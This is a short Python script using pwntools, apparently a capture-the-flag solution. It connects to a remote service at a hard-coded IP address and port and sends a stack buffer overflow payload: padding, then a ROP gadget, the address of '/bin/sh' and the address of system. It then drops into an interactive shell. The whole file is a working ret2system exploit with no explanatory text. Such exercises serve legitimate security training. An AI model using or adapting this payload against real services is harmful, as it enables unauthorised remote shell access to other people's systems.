#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
r = remote("114.67.246.176",11647)
_system = 0x401050
bin_sh = 0x402004
rep = 0x40126b
payload = b'a' * 0x20 + b'a' * 0x8 + p64(rep) + p64(bin_sh) + p64(_system)

r.sendlineafter("name.\n", payload)

r.interactive()
